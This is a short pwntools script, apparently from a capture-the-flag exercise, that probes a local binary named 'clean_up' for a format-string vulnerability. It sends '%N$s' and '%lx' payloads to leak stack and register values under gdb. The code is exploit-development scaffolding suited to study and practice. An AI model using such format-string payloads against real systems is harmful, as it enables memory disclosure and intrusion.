# from pwn import *

# for i in range(1,256):
#     payload = b"".join([
#         b"%"+str(i).encode("utf-8")+b"$s",
#     ])
    
#     p=process("./clean_up")
    
#     #p.recvuntil("Instert folder to clean:\n")
#     p.sendline(payload)
#     response = p.recvall().decode("latin-1")

from pwn import *

################## addresses #########################

#context.log_level = 'DEBUG'

#context.terminal = ['tmux', 'splitw', '-h']

# p = process("./vuln")
# gdb.attach(p, '''
# b main
# ''')
#     rsi - rdx - rcx - r8 - r9 - stack[0]
ARG = "%13$lx - %lx - %lx - %lx - %lx - %lx - %lx - %lx - %lx"
#ARG = "%lx - %lx - %lx - %lx - %lx - %lx - %lx - %lx - %lx"

p = gdb.debug(['./clean_up', ARG], f'''
b main
# b *(main+59)

# debug automatically breaks at _start - ignore it
continue
''')

#p=process("./clean_up")

p.interactive() 